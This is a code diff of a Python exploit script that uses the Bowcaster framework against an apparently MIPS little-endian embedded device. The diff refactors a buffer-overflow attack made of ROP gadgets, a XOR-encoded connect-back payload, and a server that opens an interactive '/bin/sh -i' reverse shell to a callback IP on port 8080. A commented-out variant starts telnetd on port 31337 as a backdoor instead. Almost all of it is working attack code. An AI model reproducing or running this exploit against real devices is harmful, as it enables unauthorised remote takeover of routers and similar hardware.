@@ -19,7 +19,6 @@ import time
 
 from bowcaster.overflow_development.overflowbuilder import *
 from bowcaster.common.support import LittleEndian,Logging
-from bowcaster.servers import ConnectbackHost
 from bowcaster.servers.connectback_server import ConnectbackServer
 from bowcaster.payloads.mips.connectback_payload import ConnectbackPayload
 from bowcaster.encoders.mips import *
@@ -28,7 +27,7 @@ from bowcaster.encoders.mips import *
 #from bowcaster.encoders.mips import MipsUpperAlphaEncoder
 logger=Logging()
 
-CALLBACK_IP="192.168.1.3"
+CALLBACK_IP="192.168.127.10"
 CALLBACK_PORT="8080"
 
 qemu=False
@@ -67,13 +66,12 @@ SC.gadget_section(688,0x427a4,description="stackfinder.")
 #stackjumber. jalr $s0
 SC.gadget_section(644,0x1ffbc,description="[$s0] stackjumper")
 
-connectback_host=ConnectbackHost(CALLBACK_IP) #default port is 8080
-connectback_server=ConnectbackServer(connectback_host,startcmd="/bin/sh -i")
+connectback_server=ConnectbackServer(CALLBACK_IP,startcmd="/bin/sh -i")
 
 #Or non-interactive exploitation:
 #connectback_server=ConnectbackServer(connectback_host,startcmd="/usr/sbin/telnetd -p 31337",connectback_shell=False)
 
-payload=ConnectbackPayload(connectback_host,LittleEndian)
+payload=ConnectbackPayload(CALLBACK_IP,LittleEndian)
 
 try:
     encoded_payload=MipsXorEncoder(payload,LittleEndian,key=0xecb9dcb4,badchars=badchars)
@@ -104,7 +102,7 @@ if len(sys.argv) == 2:
 addr=sys.argv[1]
 port=int(sys.argv[2])
 pid=1
-pid=connectback_server.serve_connectback()
+pid=connectback_server.serve()
 time.sleep(1)
 if pid and pid > 0:
     try:
